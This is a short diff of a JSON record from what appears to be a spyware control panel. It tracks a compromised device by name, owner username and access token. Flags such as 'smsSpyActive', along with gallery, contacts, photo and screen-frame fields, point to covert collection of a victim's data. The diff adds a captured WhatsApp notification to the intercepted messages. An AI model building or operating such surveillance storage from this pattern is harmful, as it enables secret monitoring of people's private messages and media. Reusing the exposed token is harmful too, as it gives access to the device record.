@@ -4,7 +4,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "3feee80f7243d55c1a9897c811559027",
-    "lastSeen": 1775096557259,
+    "lastSeen": 1775096569265,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T02:22:28.497Z",
@@ -19,7 +19,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "02/04 09:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775096571207
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
